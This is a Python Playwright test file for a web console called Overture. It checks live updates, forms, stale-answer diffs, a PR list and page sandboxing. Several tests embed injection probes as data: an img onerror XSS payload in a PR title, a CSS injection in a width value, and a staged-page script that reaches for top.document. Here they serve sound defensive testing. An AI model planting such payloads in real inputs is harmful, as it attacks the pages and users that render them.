                page.wait_for_timeout(300)
                self.assertEqual((hits, _Handler.board_hits), (1, 1))
                self.assertIsNone(page.query_selector(".ck-board-stale"))

    def test_a_transient_failure_keeps_polling(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                _Handler.board_hits, _Handler.board_status = 0, 503
                page = self._board_page(kind, "/board-a", BOARD_B)
                self._settle(page, 1)
                self.assertEqual(page.evaluate("window.__boardChanged"), 0)
                _Handler.board_status = 200
                page.evaluate("window.ConsoleKit.refreshBoard()")
                _wait_for(page, "window.__boardChanged > 0")

    def test_a_value_that_is_not_a_percentage_never_reaches_a_style(self):
        # "150" is valid CSS, so only console.js's own check stops it; "50%;..." the
        # browser's CSSOM would refuse anyway; "7" proves the path is live at all.
        get = "document.querySelector('[data-live-width=\"bar\"]').style.width"
        kept = BOARD_A["values"]["bar"]
        for kind in BROWSERS:
            for value, want in (("150", kept), ("50%;background:red", kept), ("7", "7")):
                with self.subTest(browser=kind, value=value):
                    bad = {"shape": BOARD_A["shape"], "values": {**BOARD_A["values"], "bar": value}}
                    page = self._board_page(kind, "/board-a", bad)
                    self._settle(page, 1)
                    self.assertEqual(page.evaluate(get), f"{want}%")

    def test_an_active_status_filter_follows_a_patched_status(self):
        flipped = sorted(i for i in REGISTER if FLIPPED[i]["status"] != REGISTER[i]["status"])[0]
        anchor = D.slugify(flipped)
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._board_page(kind, "/board-a", BOARD_A)
                self._settle(page, 1)
                page.click('.status-chip[data-status="proposed"]')
                hidden = f"document.getElementById('{anchor}').classList.contains('hidden')"
                self.assertTrue(page.evaluate(hidden))
                _Handler.board = BOARD_B
                page.evaluate("window.ConsoleKit.refreshBoard()")
                _wait_for(page, "window.__boardChanged > 0")
                self.assertFalse(page.evaluate(hidden))

    def test_a_page_without_live_marks_never_asks(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                _Handler.board_hits = 0
                page = self._board_page(kind, "/", BOARD_A)
                page.wait_for_timeout(500)
                page.evaluate("window.ConsoleKit.refreshBoard()")  # the public hook asks nothing either
                page.wait_for_timeout(300)
                self.assertEqual(_Handler.board_hits, 0)


def _locked_view() -> dict:
    """/view with LANE.1/Q1 answered and locked, and LANE.1/Q2 still unanswered."""
    import tempfile
    from overture import view as V
    from overture.store import Store
    from test_kit import answer, lock, question
    items = {"LANE.1": {"title": "first lane", "parent": None}}
    with tempfile.TemporaryDirectory() as td:
        st = Store(Path(td) / "store.jsonl", known_items=items)
        st.append(question("LANE.1/Q1"))
        st.append(question("LANE.1/Q2"))
        st.append(lock(st.append(answer("LANE.1/Q1", own_text="B, for the small rig"))))
        return {"view": V.build(st, items, lambda c: True), "items": items, "cursor": {}}


class AnswerFollowUpTests(unittest.TestCase):
    """0.4.0 (owner, 2026-09-29): a "Follow up" button beside each locked answer.

    OVERTURE_SHOTS=<dir> also saves the open panel at desktop and phone width.
    """

    @classmethod
    def setUpClass(cls):
        DockTests.setUpClass.__func__(cls)

    @classmethod
    def tearDownClass(cls):
        DockTests.tearDownClass.__func__(cls)

    def _open(self, kind: str, width: int):
        browser = getattr(self.pw, kind).launch()
        self.addCleanup(browser.close)
        page = browser.new_page(viewport={"width": width, "height": 900})
        errors: list[str] = []
        page.on("pageerror", lambda e: errors.append(str(e)))
        self.addCleanup(lambda: self.assertEqual(errors, [], f"{kind}: page errors"))
        posted: list[dict] = []
        view = json.dumps(_locked_view())
        page.route("**/api/view*", lambda r: r.fulfill(status=200, content_type="application/json", body=view))

        def on_message(route):
            posted.append(route.request.post_data_json)
            route.fulfill(status=200, content_type="application/json", body=json.dumps({"record": {}}))
        page.route("**/api/message", on_message)
        page.goto(self.url)
        page.click(".ck-item-btn")
        page.wait_for_selector(".ck-question")
        return page, posted

    def test_only_a_locked_answer_offers_it_and_it_sends_one_scoped_fork(self):
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    page, posted = self._open(kind, width)
                    _expand(page)
                    # 0.8.0: the follow-up is one of three next steps, behind "Next step ▾".
                    nxt = page.locator("button[aria-label^='Next step for']")
                    self.assertEqual(nxt.count(), 1)  # Q1 is locked; Q2 is unanswered and offers none
                    nxt.focus()
                    page.keyboard.press("Enter")
                    btns = page.locator("button[aria-label^='Follow up with other seats on']")
                    self.assertEqual(btns.count(), 1)
                    btns.focus()
                    page.keyboard.press("Enter")  # keyboard, not a mouse
                    self.assertEqual(btns.get_attribute("aria-expanded"), "true")
                    form = page.locator(".ck-followup")
                    self.assertTrue(form.locator("input[value='tighten']").is_checked())
                    # No seat picked: refused on the page, named visibly, nothing sent.
                    form.get_by_role("button", name="Send follow-up").click()
                    self.assertIn("Pick 1 to 3 seats", form.locator(".ck-error-msg").text_content())
                    self.assertEqual(posted, [])
                    for label in ("DevOps", "Security"):
                        form.get_by_label(label).focus()
                        page.keyboard.press("Space")
                    self.assertEqual(form.locator(".ck-error-msg").text_content(), "")  # a new pick clears it
                    form.get_by_label("Other seat (optional)").fill("Legal")
                    self.assertTrue(form.get_by_label("UX").is_disabled())  # three is the limit
                    form.get_by_label("Note for the seats (optional)").fill("Does B hold on tour?")
                    if os.environ.get("OVERTURE_SHOTS"):
                        card = page.locator(".ck-question", has=page.locator(".ck-followup"))
                        card.scroll_into_view_if_needed()
                        card.screenshot(path=str(Path(os.environ["OVERTURE_SHOTS"]) / f"followup-{kind}-{width}.png"))
                    self.assertFalse(page.evaluate("document.documentElement.scrollWidth > innerWidth"))
                    form.get_by_role("button", name="Send follow-up").click()
                    _wait_for(page, "document.querySelectorAll('.ck-followup').length === 0")
                    self.assertEqual(len(posted), 1)
                    body = dict(posted[0])
                    self.assertTrue(body.pop("nonce"))
                    self.assertEqual(body, {"item": "LANE.1", "intent": "fork", "mode": "tighten",
                                            "about_qid": "LANE.1/Q1", "roles": ["devops", "security", "other:Legal"],
                                            "text": "Does B hold on tour?"})



def _open_view(reply: str | None = None, lock_q3: bool = False) -> dict:
    """/view with LANE.1/Q1 locked, Q2 unanswered, and Q3 answered (not locked) with a deliberation waiting on it.

    `reply` adds an agent reply to that deliberation; `lock_q3` locks Q3 after it was asked."""
    import tempfile
    from overture import view as V
    from overture.store import Store
    from test_kit import answer, fork, lock, message, question
    items = {"LANE.1": {"title": "first lane", "parent": None}}
    with tempfile.TemporaryDirectory() as td:
        st = Store(Path(td) / "store.jsonl", known_items=items)
        for n in (1, 2, 3):
            st.append(question(f"LANE.1/Q{n}"))
        st.append(lock(st.append(answer("LANE.1/Q1", own_text="B, for the small rig"))))
        a3 = st.append(answer("LANE.1/Q3", picks=("a",)))
        f = st.append(fork(about_qid="LANE.1/Q3", roles=["analyst"], mode="explore"))
        if reply is not None:
            st.append(message(item="LANE.1", by="agent", text=reply, reply_to=f["id"]))
        if lock_q3:
            st.append(lock(a3))
        return {"view": V.build(st, items, lambda c: True), "items": items, "cursor": {}}


class DeliberateOpenQuestionTests(unittest.TestCase):
    """Owner ruling build_reply: "Deliberate before answering" on each OPEN question."""

    @classmethod
    def setUpClass(cls):
        DockTests.setUpClass.__func__(cls)

    @classmethod
    def tearDownClass(cls):
        DockTests.tearDownClass.__func__(cls)

    def _open(self, kind: str, width: int, view: dict | None = None):
        browser = getattr(self.pw, kind).launch()
        self.addCleanup(browser.close)
        page = browser.new_page(viewport={"width": width, "height": 900})
        errors: list[str] = []
        page.on("pageerror", lambda e: errors.append(str(e)))
        self.addCleanup(lambda: self.assertEqual(errors, [], f"{kind}: page errors"))
        posted: list[dict] = []
        view = json.dumps(view or _open_view())
        page.route("**/api/view*", lambda r: r.fulfill(status=200, content_type="application/json", body=view))

        def on_message(route):
            posted.append(route.request.post_data_json)
            route.fulfill(status=200, content_type="application/json", body=json.dumps({"record": {}}))
        page.route("**/api/message", on_message)
        page.goto(self.url)
        page.click(".ck-item-btn")
        page.wait_for_selector(".ck-question")
        return page, posted

    def card(self, page, n):
        return page.locator(".ck-question", has_text=f"Which for LANE.1/Q{n}?")

    def test_only_open_questions_offer_it_and_the_cost_tracks_the_seats(self):
        # Catches: the button on a locked answer (which keeps "Follow up"), no button on an
        # open question (the pre-change page), a cost line that does not move with the seats,
        # and a request that is not one owner fork about that question.
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    page, posted = self._open(kind, width)
                    _expand(page)
                    sel = "button[aria-label^='Deliberate before answering:']"
                    self.assertEqual(page.locator(sel).count(), 2)
                    self.assertEqual(self.card(page, 1).locator(sel).count(), 0)
                    self.assertEqual(self.card(page, 1).locator("button[aria-label^='Next step for']").count(), 1)
                    # The waiting deliberation on Q3 is shown on its card.
                    asked = self.card(page, 3).locator(".ck-asked")
                    self.assertIn("Deliberation before answering with Analyst", asked.text_content())
                    self.assertIn("waiting for the seats", asked.text_content())
                    btn = self.card(page, 2).locator(sel)
                    btn.focus()
                    page.keyboard.press("Enter")
                    self.assertEqual(btn.get_attribute("aria-expanded"), "true")
                    form = page.locator(".ck-deliberate")
                    self.assertEqual(form.count(), 1)
                    self.assertTrue(form.locator("input[value='explore']").is_checked())
                    cost = form.locator(".ck-cost")
                    self.assertIn("100k tokens per seat", cost.text_content())
                    form.get_by_role("button", name="Send deliberation before answering").click()
                    self.assertIn("Pick 1 to 3 seats", form.locator(".ck-error-msg").text_content())
                    self.assertEqual(posted, [])
                    form.get_by_label("Analyst").focus()
                    page.keyboard.press("Space")
                    self.assertEqual(cost.text_content(), "Cost: ≈ 1 seat × ~100k tokens = ~100k tokens.")
                    form.get_by_label("Security").check()
                    form.get_by_label("Other seat (optional)").fill("Legal")
                    self.assertEqual(cost.text_content(), "Cost: ≈ 3 seats × ~100k tokens = ~300k tokens.")
                    form.get_by_label("Analyst").uncheck()
                    self.assertEqual(cost.text_content(), "Cost: ≈ 2 seats × ~100k tokens = ~200k tokens.")
                    form.get_by_label("Note for the seats (optional)").fill("Which survives a second site?")
                    self.assertFalse(page.evaluate("document.documentElement.scrollWidth > innerWidth"))
                    form.get_by_role("button", name="Send deliberation before answering").click()
                    _wait_for(page, "document.querySelectorAll('.ck-deliberate').length === 0")
                    self.assertEqual(len(posted), 1)
                    body = dict(posted[0])
                    self.assertTrue(body.pop("nonce"))
                    self.assertEqual(body, {"item": "LANE.1", "intent": "fork", "mode": "explore",
                                            "about_qid": "LANE.1/Q2", "roles": ["security", "other:Legal"],
                                            "text": "Which survives a second site?"})

    def test_an_early_reply_leaves_it_pending_and_only_the_result_returns_it(self):
        # Review round 1. Catches: a card that calls the deliberation back on any reply to it.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page, _ = self._open(kind, 1280, _open_view(reply="Working on it: one seat running."))
                asked = self.card(page, 3).locator(".ck-asked")
                self.assertEqual(asked.get_attribute("data-done"), "false")
                self.assertIn("waiting for the seats", asked.text_content())
                page, _ = self._open(kind, 1280, _open_view(reply="Result: ★ a\nbecause it holds"))
                asked = self.card(page, 3).locator(".ck-asked")
                self.assertEqual(asked.get_attribute("data-done"), "true")
                self.assertIn("back: Result: ★ a", asked.text_content())
                self.assertNotIn("because", asked.text_content())

    def test_the_label_is_the_forks_own_kind_after_a_lock(self):
        # Review round 1, LOW. Catches: a deliberation before answering relabelled
        # "Follow-up" once the owner locks the question.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page, _ = self._open(kind, 1280, _open_view(lock_q3=True))
                _expand(page)
                card = self.card(page, 3)
                self.assertEqual(card.locator("button[aria-label^='Deliberate before answering:']").count(), 0)
                text = card.locator(".ck-asked").text_content()
                self.assertIn("Deliberation before answering with Analyst", text)
                self.assertNotIn("Follow-up", text)

    def test_seats_and_mode_survive_a_rebuild_of_the_form(self):
        # Review round 1, LOW. Catches: a re-render (Refresh, a live update) that drops the
        # owner's seat ticks and mode while keeping only the note.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page, _ = self._open(kind, 1280)
                btn = self.card(page, 2).locator("button[aria-label^='Deliberate before answering:']")
                btn.click()
                form = page.locator(".ck-deliberate")
                form.get_by_label("Analyst").check()
                form.get_by_label("Other seat (optional)").fill("Legal")
                form.locator("input[value='tighten']").check()
                btn.click()  # closed: the form is gone
                self.assertEqual(page.locator(".ck-deliberate").count(), 0)
                btn.click()  # rebuilt from scratch
                form = page.locator(".ck-deliberate")
                self.assertTrue(form.get_by_label("Analyst").is_checked())
                self.assertFalse(form.get_by_label("Security").is_checked())
                self.assertEqual(form.get_by_label("Other seat (optional)").input_value(), "Legal")
                self.assertTrue(form.locator("input[value='tighten']").is_checked())
                self.assertEqual(form.locator(".ck-cost").text_content(),
                                 "Cost: ≈ 2 seats × ~100k tokens = ~200k tokens.")


def _stale_view() -> tuple[dict, dict]:
    """/view and /check with LANE.1/Q1 locked on an excerpt whose text then changed, both built by the kit."""
    import tempfile
    from overture import anchors as A
    from overture import view as V
    from overture.store import Store
    from test_kit import answer, lock, question
    items = {"LANE.1": {"title": "first lane", "parent": None}}
    with tempfile.TemporaryDirectory() as td:
        spec = Path(td) / "spec.md"
        spec.write_text("Intro.\nThe console refuses a write from any other origin.\nTail.\n")
        st = Store(Path(td) / "store.jsonl", known_items=items)
        st.append(question("LANE.1/Q1", valid_if=[{"kind": "excerpt", "path": "spec.md",
                                                     "text": "The console refuses a write from any other origin."}]))
        st.append(lock(st.append(answer("LANE.1/Q1", own_text="B, for the small rig"))))
        spec.write_text("Intro.\nThe console refuses a write from a different origin.\nTail.\n")
        view = {"view": V.build(st, items, V.make_evaluator(Path(td), {})), "items": items, "cursor": {}}
        return view, {"stale": A.check(st, Path(td), {})}


NOGIT = "unavailable (no git in the server)"


def _seam_closed(test) -> None:
    """Close the git seam for one test, as `server.serve` does for the console's process (CONSOLE-kit/Q23)."""
    from unittest import mock
    from overture import gitseam as G
    p = mock.patch.object(G, "_OPEN", False)
    p.start()
    test.addCleanup(p.stop)


class WhyStaleTests(unittest.TestCase):
    """0.5.0: a stale answer says why, and the owner can re-lock it as it stands."""

    @classmethod
    def setUpClass(cls):
        DockTests.setUpClass.__func__(cls)

    @classmethod
    def tearDownClass(cls):
        DockTests.tearDownClass.__func__(cls)

    def test_why_stale_shows_the_change_and_relock_sends_only_qid_and_nonce(self):
        view, check = _stale_view()
        self.assertEqual(view["view"]["questions"]["LANE.1/Q1"]["state"], "stale")
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    browser = getattr(self.pw, kind).launch()
                    self.addCleanup(browser.close)
                    page = browser.new_page(viewport={"width": width, "height": 900})
                    errors: list[str] = []
                    page.on("pageerror", lambda e: errors.append(str(e)))
                    posted: list[dict] = []
                    page.route("**/api/view*", lambda r: r.fulfill(status=200, content_type="application/json",
                                                                   body=json.dumps(view)))
                    page.route("**/api/check", lambda r: r.fulfill(status=200, content_type="application/json",
                                                                   body=json.dumps(check)))

                    def on_relock(route):
                        posted.append(route.request.post_data_json)
                        route.fulfill(status=200, content_type="application/json", body=json.dumps({"records": []}))
                    page.route("**/api/relock", on_relock)
                    page.goto(self.url)
                    page.click(".ck-item-btn")
                    page.wait_for_selector(".ck-stale-banner")
                    why = page.locator("button[aria-label^='See what changed under this ruling']")
                    why.focus()
                    page.keyboard.press("Enter")
                    page.wait_for_selector(".ck-why-diff")
                    words = page.locator(".ck-why").text_content()
                    self.assertIn("no longer in spec.md", words)
                    diff = page.locator(".ck-why-diff").text_content()
                    self.assertIn("-The console refuses a write from any other origin.", diff)
                    self.assertIn("+The console refuses a write from a different origin.", diff)
                    self.assertFalse(page.evaluate("document.documentElement.scrollWidth > innerWidth"))
                    if os.environ.get("OVERTURE_SHOTS"):
                        page.locator(".ck-question").first.screenshot(
                            path=str(Path(os.environ["OVERTURE_SHOTS"]) / f"why-stale-{kind}-{width}.png"))
                    page.locator("button[aria-label^='Re-lock this answer as it stands']").click()
                    page.get_by_role("button", name="Re-lock as it stands").click()
                    _wait_for(page, "document.querySelectorAll('.ck-confirm').length === 0")
                    self.assertEqual(len(posted), 1)
                    body = dict(posted[0])
                    self.assertTrue(body.pop("nonce"))
                    self.assertEqual(body, {"qid": "LANE.1/Q1"})  # never anchors: the server computes them
                    self.assertEqual(errors, [], f"{kind}: page errors")

    def test_why_stale_says_git_history_is_unavailable_in_the_server(self):
        # CONSOLE-kit/Q23. Catches: a "why stale" that goes blank, or reads as "not in the recent
        # history", when the server simply never asked git.
        import hashlib
        import tempfile
        from overture import anchors as A
        from overture import view as V
        from overture.store import Store
        from test_kit import answer, lock, question
        _seam_closed(self)
        items = {"LANE.1": {"title": "first lane", "parent": None}}
        with tempfile.TemporaryDirectory() as td:
            spec = Path(td) / "spec.md"
            spec.write_text("Intro.\nThe cited claim.\nTail.\n")
            st = Store(Path(td) / "store.jsonl", known_items=items)
            st.append(question("LANE.1/Q1", valid_if=[{"kind": "file_sha256", "path": "spec.md",
                                                         "sha256": hashlib.sha256(spec.read_bytes()).hexdigest()}]))
            st.append(lock(st.append(answer("LANE.1/Q1"))))
            spec.write_text("A new first line.\nIntro.\nThe cited claim.\nTail.\n")
            view = {"view": V.build(st, items, V.make_evaluator(Path(td), {})), "items": items, "cursor": {}}
            check = {"stale": A.check(st, Path(td), {}), "history": NOGIT}
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                browser = getattr(self.pw, kind).launch()
                self.addCleanup(browser.close)
                page = browser.new_page(viewport={"width": 375, "height": 900})
                errors: list[str] = []
                page.on("pageerror", lambda e: errors.append(str(e)))
                page.route("**/api/view*", lambda r: r.fulfill(status=200, content_type="application/json",
                                                               body=json.dumps(view)))
                page.route("**/api/check", lambda r: r.fulfill(status=200, content_type="application/json",
                                                               body=json.dumps(check)))
                page.goto(self.url)
                page.click(".ck-item-btn")
                page.wait_for_selector(".ck-stale-banner")
                page.locator("button[aria-label^='See what changed under this ruling']").click()
                page.wait_for_selector(".ck-why-list li")
                words = page.locator(".ck-why").text_content()
                self.assertIn(f"spec.md changed since this answer was locked. Git history is {NOGIT}", words)
                self.assertFalse(page.evaluate("document.documentElement.scrollWidth > innerWidth"))
                self.assertEqual(errors, [], f"{kind}: page errors")


# -- 0.7.0: a live console, against the REAL server --------------------------------------
#
# These run the kit's own server (Access gate, Origin check, store, doorbell) on
# loopback. The page cannot hold an Access token, so a Playwright route adds the
# header Cloudflare would, and the Origin the public hostname carries; nothing
# else about a request is touched. The agent writes through its real socket.

LIVE_ITEMS = {"LANE": {"title": "a lane", "parent": None, "status": "open"},
              "LANE.1": {"title": "first lane", "parent": "LANE", "status": "open"}}
LIVE_HOST = HOST.replace('<details id="item-LANE.1">', '<details id="item-LANE"><summary>LANE a lane</summary>'
                         '</details>\n<details id="item-LANE.1">')
OVERFLOW = "document.documentElement.scrollWidth > innerWidth"


class _LiveAdapter:
    def items(self):
        return dict(LIVE_ITEMS)

    def seed_questions(self):
        return []

    def record(self, entries, dry_run):
        return []


class LiveConsoleTests(unittest.TestCase):
    """0.7.0: new activity without reload, the Feed, the review-round form and the chat."""

    @classmethod
    def setUpClass(cls):
        if not REQUIRED:
            raise unittest.SkipTest("browser tests run only with OVERTURE_BROWSER=1")
        sp = _playwright()
        if sp is None:
            raise RuntimeError("OVERTURE_BROWSER=1 but Playwright is not installed")
        cls.pw = sp().start()

    @classmethod
    def tearDownClass(cls):
        cls.pw.stop()

    # -- the real server ------------------------------------------------------------

    def serve(self, snapshot=False, page=LIVE_HOST, publish=True):
        """The real Console and doors; `snapshot` gives it what `serve` gives it since Q24 (pushed items only).

        `page` is staged as the steward's page snapshot (Q28) and, with `publish`, published as the owner's
        "Use this page" would (Q29): only a published page is served.
        """
        import tempfile
        from overture import items as IT
        from overture import server as SV
        from test_server import AUD, HOSTNAME, KEY, TEAM, page_body, token
        td = tempfile.mkdtemp(prefix="ck-live-")
        self.addCleanup(lambda: __import__("shutil").rmtree(td, ignore_errors=True))
        root = Path(td)
        cfg = SV.Config(root=root, page=None, state=root / "state", adapter=root / "unused.py",
                        team_domain=TEAM, aud=AUD, hostname=HOSTNAME, port=0, project="live-test")
        console = SV.Console(cfg, IT.SnapshotAdapter(cfg.state) if snapshot else _LiveAdapter())
        staged = console.push_page_snapshot(page_body(page))   # Q28: the page is the steward's snapshot in STATE
        if publish:   # Q29: what the owner's "Use this page" does
            console.publish_page({"commit": staged["staged"]})
        verify = SV.access_verifier(TEAM, AUD, key_for=lambda _t: KEY.public_key())
        owner = SV.owner_server(console, verify, 0)
        threading.Thread(target=owner.serve_forever, daemon=True).start()
        agent = SV.agent_server(console)
        threading.Thread(target=agent.serve_forever, daemon=True).start()
        self.addCleanup(owner.server_close)
        self.addCleanup(owner.shutdown)
        self.addCleanup(agent.server_close)
        self.addCleanup(agent.shutdown)
        self.tok, self.origin = token(), f"https://{HOSTNAME}"
        self.SV, self.console, self.cfg = SV, console, cfg
        return f"http://127.0.0.1:{owner.server_address[1]}/"

    def agent_post(self, path, body):
        code, out = self.SV.agent_request(self.cfg.socket, "POST", path, body)
        self.assertEqual(code, 200, out)
        return out["record"]

    def ask(self, n, item="LANE.1", **over):
        body = {"qid": f"{item}/Q{n}", "item": item, "text": f"Question {n}: which way?", "kind": "single",
                "options": [{"id": "fix", "label": "Fix now"}, {"id": "record", "label": "Record in findings.md"},
                            {"id": "leave", "label": "Leave it"}],
                "star": "fix", "source": "docs/spec.md:1", "valid_if": [], "nonce": f"liveq{n:04d}" + item.replace(".", "_")}
        body.update(over)
        return self.agent_post("/question", body)

    def bell(self):
        p = self.cfg.inbox
        return [json.loads(x) for x in p.read_text().splitlines()] if p.exists() else []

    def page(self, kind, width, url, reduced=False, block_live=False, init=None, mobile=False, height=900):
        browser = getattr(self.pw, kind).launch()
        self.addCleanup(browser.close)
        # `mobile` (1.48): a phone's layout viewport, which grows to a host page wider than the screen (uxshot 02).
        # Firefox has no mobile emulation; there it is the narrow window alone.
        extra = {"is_mobile": True, "has_touch": True} if mobile and kind != "firefox" else {}
        ctx = browser.new_context(viewport={"width": width, "height": height},
                                  reduced_motion="reduce" if reduced else "no-preference", **extra)
        ctx.add_init_script(INBOX_CLOSED_THIS_SESSION)
        if init:
            ctx.add_init_script(init)
        page = ctx.new_page()
        errors: list[str] = []
        page.on("pageerror", lambda e: errors.append(str(e)))
        self.addCleanup(lambda: self.assertEqual(errors, [], f"{kind}: page errors"))
        self.waits: list[float] = []

        def through_access(route):
            if "/api/wait" in route.request.url:
                self.waits.append(time.monotonic())
            h = {**route.request.headers, "cf-access-jwt-assertion": self.tok}
            if route.request.method == "POST":
                # A browser will not let a page's route rewrite Origin, so a write is
                # re-sent from Playwright with the Origin the public hostname carries.
                h["origin"] = self.origin
                try:
                    route.fulfill(response=route.fetch(headers=h))
                except Exception:
                    # A write the page sends as its browser closes (a draft saved on the way out)
                    # has no one left to answer; raised here, it would fail the NEXT test's first call.
                    if not page.is_closed():
                        raise
                return
            route.continue_(headers=h)
        page.route("**/*", through_access)
        if block_live:  # routes run newest first: every long poll fails, so the page never updates itself
            page.route("**/api/wait*", lambda route: route.abort())
        page.goto(url)
        _wait_for(page, "document.querySelector('.ck-inbox-count').textContent !== '✉'")  # 1.24.0: the pre-load glyph
        page.evaluate("window.__notReloaded = true")
        return page

    def open_inbox(self, page, width):
        page.click(".ck-dock-strip" if width >= 1024 else ".ck-inbox-btn")
        page.wait_for_selector(".ck-tabs")

    def open_section_tab(self, page, section, tab):
        # 1.48 (U1): a tab outside Work sits in its section; the rail button shows the section's strip, and the
        # tab is then a tab like any other, selected once chosen.
        page.click(f".ck-rail-btn[data-section='{section}']")
        page.click(f"#ck-tab-{tab}")
        _wait_for(page, "t => { const b = document.getElementById('ck-tab-' + t);"
                        " return !!b && b.getAttribute('aria-selected') === 'true'; }", tab)

    def assert_not_reloaded(self, page):
        self.assertTrue(page.evaluate("window.__notReloaded === true"), "the page reloaded")

    # -- tests -------------------------------------------------------------------------

    def test_before_the_first_items_push_the_inbox_says_why_the_board_is_empty(self):
        # Q24. Catches: a silent blank before the steward's first push (the server runs no adapter, so it has
        # no items until then), the note never rendered, and a note that stays after the push arrives.
        # 1.24.0 put the note in the first-run hero (a labelled region), under its "How this works" disclosure.
        from overture import items as IT
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve(snapshot=True)
                page = self.page(kind, 1280, url)
                self.open_inbox(page, 1280)
                hero = page.wait_for_selector(".ck-firstrun")
                self.assertEqual((hero.get_attribute("role"), hero.get_attribute("aria-label")),
                                 ("region", "Welcome to Overture"))
                page.click(".ck-firstrun-summary")
                note = page.wait_for_selector(".ck-firstrun-note", state="visible")
                self.assertEqual(note.text_content(), IT.NOT_PUSHED)
                code, out = self.SV.agent_request(self.cfg.socket, "POST", "/items",
                                                  {"items": dict(LIVE_ITEMS), "seed_questions": [], "board": None})
                self.assertEqual(code, 200, out)
                _wait_for(page, "document.querySelector('.ck-firstrun') === null", timeout=10000)
                self.assert_not_reloaded(page)

    def test_the_prs_tab_says_why_it_is_empty_then_renders_hostile_titles_as_text(self):
        # Catches: a blank list (or invented PRs) before the steward's first prs-push; a title or branch put in
        # with innerHTML (the img's onerror would run and mark the body); a link that is not the PR's GitHub URL,
        # or one that opens without noopener; a merged PR above an open one; a question the title names that is
        # not linked to its item; and a PRs view that never re-reads after a live push.
        from overture import prs as PR
        hostile = "<img src=x onerror=\"document.body.setAttribute('data-ran','pr')\"> fixes LANE.1/Q1"
        pr = lambda n, **o: {**{"number": n, "title": f"PR {n}", "state": "open", "draft": False,
                                "head": f"lane-{n}", "base": "main", "author": "octo",
                                "created_at": "2026-09-30T10:00:00Z", "updated_at": "2026-09-30T11:00:00Z",
                                "merged_at": None, "closed_at": None,
                                "url": f"https://github.com/octo/repo/pull/{n}", "merge_commit": None,
                                "checks": "success"}, **o}
        push = {"repo": "octo/repo", "window_days": 30, "prs": [
            pr(4, title=hostile, head="<b>x</b>", draft=True, checks="failure"),
            pr(3, title="constructor toString __proto__ hasOwnProperty", head="valueOf", state="merged",
               merged_at="2026-09-29T08:00:00Z", closed_at="2026-09-29T08:00:00Z", merge_commit="a" * 40)]}
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    url = self.serve()
                    self.ask(1)
                    page = self.page(kind, width, url)
                    self.open_inbox(page, width)
                    page.click("#ck-tab-prs")
                    note = page.wait_for_selector(".ck-prs-note")
                    self.assertEqual((note.text_content(), note.get_attribute("role")), (PR.NOT_PUSHED, "status"))
                    self.assertEqual(page.locator(".ck-pr-row").count(), 0)
                    code, out = self.SV.agent_request(self.cfg.socket, "POST", "/prs", push, agent="agent-5")
                    self.assertEqual(code, 200, out)
                    page.wait_for_selector(".ck-pr-row", timeout=10000)   # the live wake re-read it
                    self.assertEqual(page.eval_on_selector_all(".ck-pr-row", "rs => rs.map(r => r.dataset.number)"),
                                     ["4", "3"])
                    first = page.locator(".ck-pr-row[data-number='4']")
                    self.assertEqual(first.locator(".ck-pr-title").text_content(), hostile)
                    self.assertIn("<b>x</b> → main", first.locator(".ck-pr-branch").text_content())
                    self.assertEqual(page.locator(".ck-prs img, .ck-prs b").count(), 0)
                    self.assertIsNone(page.evaluate("document.body.getAttribute('data-ran')"))
                    link = first.locator("a.ck-pr-link")
                    self.assertEqual((link.get_attribute("href"), link.get_attribute("target"),
                                      link.get_attribute("rel")),
                                     ("https://github.com/octo/repo/pull/4", "_blank", "noopener noreferrer"))
                    self.assertIn("draft", first.text_content())
                    self.assertIn("checks fail", first.text_content())
                    self.assertIn("merged", page.locator(".ck-pr-row[data-number='3']").text_content())
                    # Object.prototype names are not items: no Open button for them.
                    self.assertEqual(page.locator(".ck-pr-row[data-number='3'] button").count(), 0)
                    self.assertIn("by the steward (agent-5)", page.locator(".ck-prs-pushed").text_content())
                    self.assertFalse(page.evaluate(OVERFLOW))
                    first.locator("button", has_text="Open LANE.1/Q1").click()
                    page.wait_for_selector(".ck-back-btn")   # the item the question belongs to, opened
                    self.assert_not_reloaded(page)

    def test_the_snapshot_pages_own_script_runs_beside_the_console(self):
        # Q28 point 4. Catches: a CSP or an injection change that stops the page's own inline script (the dashboard
        # breaks) or the console's (the owner loses the console), and the page's provenance line not shown.
        html = LIVE_HOST.replace("</body>", '<script>document.body.dataset.pageScript = "ran";</script></body>')
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve(page=html)
                page = self.page(kind, 1280, url)
                _wait_for(page, "document.body.dataset.pageScript === 'ran'", timeout=10000)
                self.open_inbox(page, 1280)   # the console's own script built its dock and inbox
                self.assertIn("(staged by the steward, published by you)",
                              page.locator(".ck-page-source").text_content())

    def test_a_staged_pages_script_never_runs_until_the_owner_publishes_it(self):
        # Q29 point 3, the browser proof. The staged page's script tries to mark its own frame and the console's
        # page. Catches: the preview frame given allow-scripts or allow-same-origin, the preview route served under
        # a CSP that runs script, the staged page served before the click, and a button that does not publish.
        html = LIVE_HOST.replace("</body>", '<p id="staged-mark">STAGED-PAGE</p><script>'
                                 'document.body.dataset.pageScript = "ran";'
                                 'try { top.document.body.dataset.leaked = "yes"; } catch (e) {}</script></body>')
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve(page=html, publish=False)
                page = self.page(kind, 1280, url)
                self.assertEqual(page.locator(".ck-page-proposed-line").count(), 1)
                self.assertEqual(page.locator("#staged-mark").count(), 0)   # proposed, not served
                self.open_page_dialog(page)
                frame_el = page.wait_for_selector("dialog.ck-page-dialog[open] .ck-page-preview iframe")
                self.assertEqual(frame_el.get_attribute("sandbox"), "")
                frame = frame_el.content_frame()
                frame.wait_for_selector("#staged-mark")   # the preview rendered the staged markup
                page.wait_for_timeout(500)   # time for a script that was going to run
                self.assertTrue(frame.evaluate("document.body.dataset.pageScript === undefined"),
                                "the staged page's script ran in the preview")
